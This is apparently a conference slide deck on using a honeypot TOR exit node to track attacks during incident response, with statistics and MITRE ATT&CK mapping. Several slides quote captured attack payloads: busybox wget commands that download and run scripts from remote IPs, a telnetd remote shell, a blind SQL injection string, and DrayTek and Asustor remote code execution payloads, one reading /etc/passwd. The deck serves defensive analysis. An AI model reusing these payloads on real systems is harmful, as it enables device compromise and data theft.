Hunting bad guys that use TOR in real-time
Milind Bhargava

Agenda

1

What is TOR

2

The relation between TOR and IR

3

My lab setup

4

Identifying patterns

5

MITRE ATT&CK Framework

6

Past real-life examples / use cases

7

Conclusion ­ why this is crucial for IR

Mjolnir Security

4 6 9 10 19 21 23
2

Your presenter
12+ years of experience Threat intelligence Incident response Big data analytics
Mjolnir Security

Milind Bhargava
3

What is TOR (The Onion Router)?

1. User

2. Entry Node

4. Exit Node

3. Relay Node

5. Website

2M + users1
1 The TOR project
Mjolnir Security
Images from: https://torproject.com and https://envato.com

Encrypted traffic

The main selling point: Anonymity
4

TOR is used for a lot of malicious activity

Image from: https://us-cert.cisa.gov/sites/default/files/publications/AA20-183A_Defending_Against_Malicious_Cyber_Activity_Originating_from_Tor_S508C.pdf

Mjolnir Security

5

The relation between TOR and IR
Often an IR investigation reaches a dead-end due to TOR related reasons, such as:

1

2

Malware and bad guys communicate
through TOR

Victim organizations are not blocking traffic originating from or destined to TOR

3
Data exfiltration investigation starts and stops at TOR

Mjolnir Security

6

Incident background
Client's internet facing infrastructure (according to the client)
 Printers  Web servers (websites and DMZs)  Default Apache pages (and corresponding default
installations)  Firewalls  SCADA / IoT devices
...additional systems found by our scans
 Unpatched web servers  Systems running Windows 2003  FTP servers without authentication  Linux embedded servers
Mjolnir Security

BusyBox (present on all the client's IoT devices)
 Attacker harvested credentials and reused throughout the environment
 Attacker used a TOR connection to perform the compromise and malicious acts
BusyBox devices (Shodan)
7

So I dug a little more into the attack

Malicious script -> downloaded onto client server -> executed
POST /bin/busybox wget http://185.172.110.226/LrsDbins.sh; chmod +x LrsDbins.sh; ./LrsDbins.sh\

POST /bin/busybox wget http://81.19.215.118/8UsA.sh; chmod +x 8UsA.sh; sh 8UsA.sh\

POST /bin/busybox telnetd -l /bin/sh -p 43193 1>/dev/null 2>/dev/null &\

telnet session launched, game over

BusyBox POST requests originating from TOR IPs of Relay Nodes past 90d

Mjolnir Security

8

My lab setup

Motivation
 Client incident investigation · How was the client related to TOR? · How was the connection with TOR established? · Identifying the true P0 · Complete IR investigation

Challenges

My lab setup

 By design, TOR doesn't log traffic  Users torrent over TOR, which is
troublesome for exit node owners  Inconsistent data  Hammered by attacks from TOR and the
internet
Authentication activity over a 24h period

 TOR exit node  A custom honeypot script to capture
and log all http-based attacks  Sumologic for data analytics

Mjolnir Security

9

Honeypot log search for `POST/bin/busybox' over a 30d period

Mjolnir Security

21 unique IPs hosting malicious scripts 53 TOR IPs pushing the scripts 4036 unique targets
10

What else can I learn from the honeypot logs?
Last 30d

Last 365d

And the prize of favorite attack type goes to ... SQL injection

Mjolnir Security

11

Other attacks that follow a similar pattern
Armed with learnings from the incident, I started to analyze the honeypot data that I had collected. At first glance, most of the attacks seemed like automated web scanners.

Activity POST cf_captcha_kind=h&r=Http://testasp.vulnweb.com/t/fit.txt&vc=\ POST <?php echo(md5(acunetix-php-cgi-rce)); ?>\

Attack web scan php injection

POST task=panier&mode=cde&catcode=2010' AND (SELECT 6909 FROM (SELECT(SLEEP(5(IF(ORD(MID((SELECT DISTINCT(IFNULL(CAST(schema_name AS NCHAR),0x20)) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 0,1),5,1))>96,0,5)))))AjeK) AND 'Tpmt'='Tpmt&tmp_shopSID=1761594151090&SID=sBSc&lang=fr&prd_id=14313&options=122113&qte=1\

sql injection

Mjolnir Security

12

Mapping all honeypot data to attack type
I was able to take all the data from the honeypot and plot it into different types of attacks

Mjolnir Security

13

Live feed of attacks filtered into subcategories

Mjolnir Security

14

Live feed of attacks filtered into subcategories

PHP injections attack
Mjolnir Security

Cross Site Scripting (XSS) attacks

SQL injections attack
15

Attack "source" breakdown ­ mostly vulnerability scanners

100.00% 90.00% 80.00% 70.00% 60.00% 50.00% 40.00% 30.00% 20.00% 10.00% 0.00%

Attacks in last month
85.88%

Automated Scanning

14.12% Actual Exploits

Mjolnir Security

16

Digging deeper into "actual exploits" ­ Remote Code Execution
Attack payload (225 other variants detected): / \(POST action=login&keyPath='uname${IFS}-a'&loginUser=a&loginPwd=a\
Pattern Match to: action=login&keyPath=%27%0A%2fbin%2fcat${IFS}%2fetc%2fpasswd%0A%27&loginUser=a&loginPwd=a
Attribution: CVE-2020-8515: DrayTek pre-auth remote root RCE Published: Mon Mar 30 2020 - 0xsha.io - https://www.exploit-db.com/exploits/48268 Affected: DrayTek Vigor2960 1.3.1_Beta, Vigor3900 1.4.4_Beta, and Vigor300B 1.3.3_Beta, 1.4.2.1_Beta, and 1.4.4_Beta
Total attacks detected Apr-Jul 2020 = 2,878,896

Mjolnir Security

17

More "actual exploits"
Attack Payload: POST #!/bin/sh MONITOR_PATH=/volume0/usr/builtin/webman/p\
Pattern Match to: /volume0/usr/builtin/webman/
Attribution: Title: Asustor ADM 3.1.2RHG1 - Remote Code Execution - https://www.exploit-db.com/exploits/45212 Author: Matthew Fulton & Kyle Lovett, Date: 2018-07-01 Software Link: http://download.asustor.com/download/adm/X64_G3_3.1.2.RHG1.img Version: <= ADM 3.1.2RHG1 CVE : CVE-2018-11510
Total attacks detected Apr-Jul 2020 = 947

Mjolnir Security

18

Mjolnir Security
Image from: https://attack.mitre.org/

Threat activities mapped to the MITRE ATT&CK Framework
19

Honeypot threat activity vs. MITRE ATT&CK

Discovery ­ 770k+ events

Execution ­ 3.2M+ events

Initial Access ­ 17.6M+ events
Mjolnir Security

Command and Control ­ 2.2M+ events
20

How does this relate to IR?
It's important to start with being proactive

Source address Mapped threat

10.152.XX.XX 10.152.XX.XX 10.152.XX.XX

KillChain->Command & Control, Malware->Emotet KillChain->Command & Control, Malware->Emotet KillChain->Command & Control, Malware->Emotet

Sent_bytes 254189 24129 232968

Recvd_bytes 60 60 60

Example of a client where there was outbound beaconing activity to known malicious IP where the firewall was not blocking connections to TOR

Mjolnir Security

21

What have we seen as Attacks vs Non-Attack traffic so far?

Last 30d

Last 365d

Last 900d

37.55% 62.45%

34.88% 65.12%

50.83%

49.17%

Attack Traffic Non Attack

Attack Traffic Non Attack

Attack Traffic Non Attack

Mjolnir Security

22

Conclusion ­ why this is crucial for IR

Be proactive
Only playing on the defensive is a long-term losing strategy as your
only option is to react
Mjolnir Security

TOR is not an investigation's dead end anymore
It's possible to follow the breadcrumbs further and investigate attacks in realtime, and thus learn more about new attack techniques in play
Predictive analysis
Understanding where the bad guy is in the attack process, you can then adequately circumvent his next steps bad mitigate threats before they happen to you
23

Thank you!

